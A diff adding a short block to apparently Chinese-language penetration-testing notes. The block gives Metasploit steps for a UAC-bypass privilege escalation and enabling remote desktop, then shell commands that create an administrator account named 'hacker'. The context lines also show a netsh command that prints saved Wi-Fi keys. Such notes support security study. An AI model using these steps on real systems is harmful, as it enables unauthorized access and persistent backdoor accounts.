@@ -115,6 +115,25 @@ netsh wlan show profile name="ssid" KEY=clear
 
 windows 控制台cmd乱码的解决办法 chcp 65001
 
+
+```cs
+getuid
+#如果当前是user权限要管理员权限才能开启3389
+#要用到bypassuac提权
+use exploit/windows/local/bypassuac
+set session 1
+run
+
+run post/windows/manage/enable_rdp
+
+#进入shell
+net user hacker 123qwe.. /add
+#将用户提升到管理员权限
+net localgroup administrators hacker /add
+```
+
+
+
 参考链接
 [使用hashcat爆破各种hash | 若水斋](https://blog.werner.wiki/use-hashcat-crack-all-kinds-of-hash/)
 
